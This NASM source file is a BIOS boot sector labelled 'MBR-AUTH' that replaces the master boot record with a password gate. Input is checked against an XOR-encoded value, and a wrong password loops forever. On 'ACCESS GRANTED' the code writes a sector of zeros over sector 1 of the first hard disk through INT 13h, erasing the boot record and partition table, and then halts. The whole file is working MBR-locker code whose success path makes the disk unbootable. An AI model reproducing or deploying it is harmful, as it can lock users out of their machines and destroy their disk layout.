;===================================;
; [ OWNER ]
;     CREATOR  : Vladislav Khudash
;     AGE      : 17
;     LOCATION : Ukraine
;
; [ PINFO ]
;     DATE     : 09.03.2026
;     PROJECT  : MBR-AUTH
;     PLATFORM : BIOS
;     ASM      : NASM (Intel Syntax)
;===================================;




%define PASSWORD (HERE XOR PASSWORD)


%define MAX_LEN_PASSWORD    30
%define XOR_KEY             0x3F


%define THEME_OK            0x0A
%define THEME_NO            0x0C




BITS 16
ORG 0x7C00




start:
    cli

    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00 

    sti


CLEAR_OUTPUT:
    mov ax, 0x0003  
    int 0x10

    mov ah, 0x01
    mov cx, 0x2607
    int 0x10

    mov bh, THEME_NO
    call SET_COLOR

    mov si, MSG
    call PRINT


input_gate:
    mov si, prompt
    call PRINT

    mov di, buffer
    xor cx, cx     


.wait_key:
    xor ah, ah
    int 0x16        

    cmp al, 0x0D    
    je .on_enter

    cmp al, 0x08   

    je .backspace
    cmp cx, MAX_LEN_PASSWORD
    jae .wait_key  

    stosb          
    inc cx
    jmp .wait_key


.backspace:
    jcxz .wait_key

    dec di
    dec cx

    mov ah, 0x0E
    mov al, 0x08 

    int 0x10
    mov al, ' '  
    int 0x10
    mov al, 0x08 
    int 0x10

    jmp .wait_key


.on_enter:
    jcxz .PRINT_DENIED    
    mov byte [di], 0 

    mov si, buffer
    mov di, xp


.pass_equal:
    lodsb      

    mov bl, al      
    xor al, XOR_KEY 
    
    cmp al, [di]    
    jne .PRINT_DENIED_pre 
    
    test bl, bl     
    jz .ACCESS_GRANTED 
    
    inc di
    jmp .pass_equal


.PRINT_DENIED_pre:
    call CLEAR_ARRAY
    jmp .PRINT_DENIED


.ACCESS_GRANTED:
    call CLEAR_ARRAY
    jmp .Restore


.Restore:
    mov ax, 0x0003 
    int 0x10

    mov bh, THEME_OK
    call SET_COLOR

    mov si, msg_granted
    call PRINT
    
    mov di, 0x0500     
    mov cx, 256         
    xor ax, ax          
    rep stosw

    mov ax, 0x0301     
    mov cx, 0x0001    
    mov dx, 0x0080     
    mov bx, 0x0500     
    int 0x13           
    
    mov ah, 0x86
    mov cx, 0x001E      
    mov dx, 0x8480
    int 0x15

    cli
    hlt            


.PRINT_DENIED:
    mov ax, 0x0003  
    int 0x10

    mov bh, THEME_NO
    call SET_COLOR

    mov si, msg_denied
    call PRINT

    mov ax, 0x0E07
    int 0x10

    mov ah, 0x86
    mov cx, 0x002D
    mov dx, 0xC6C0
    int 0x15

    jmp CLEAR_OUTPUT 


CLEAR_ARRAY:
    pusha

    mov di, buffer
    mov cx, MAX_LEN_PASSWORD + 1

    xor al, al
    rep stosb

    popa
    ret


PRINT:
    mov ah, 0x0E


.loop:
    lodsb

    test al, al

    jz .done
    int 0x10
    jmp .loop


.done:
    ret


SET_COLOR:
    push ax
    push cx
    push dx

    mov ah, 06h      
    mov al, 0          
    xor cx, cx        
    mov dx, 0x184F     
    int 10h           

    mov ah, 02h
    xor bh, bh         
    xor dx, dx
    int 10h

    pop dx
    pop cx
    pop ax
    ret




MSG         db                  "[ AUTH SYSTEM ]",           13, 10
            db                  "STATUS:PROTECTED",          13, 10, 13, 10
            db                  "Authentication required",   13, 10
            db                  "Enter password to proceed", 13, 10, 0


prompt      db 13, 10, 13, 10, "PASSWORD: ",                 0
msg_denied  db                 "[-] ACCESS DENIED",          0
msg_granted db                 "[+] ACCESS GRANTED",         0




xp db    PASSWORD,    XOR_KEY,         0
buffer times (MAX_LEN_PASSWORD + 1) db 0




times 510 - ($ - $$) db 0
dw 0xAA55
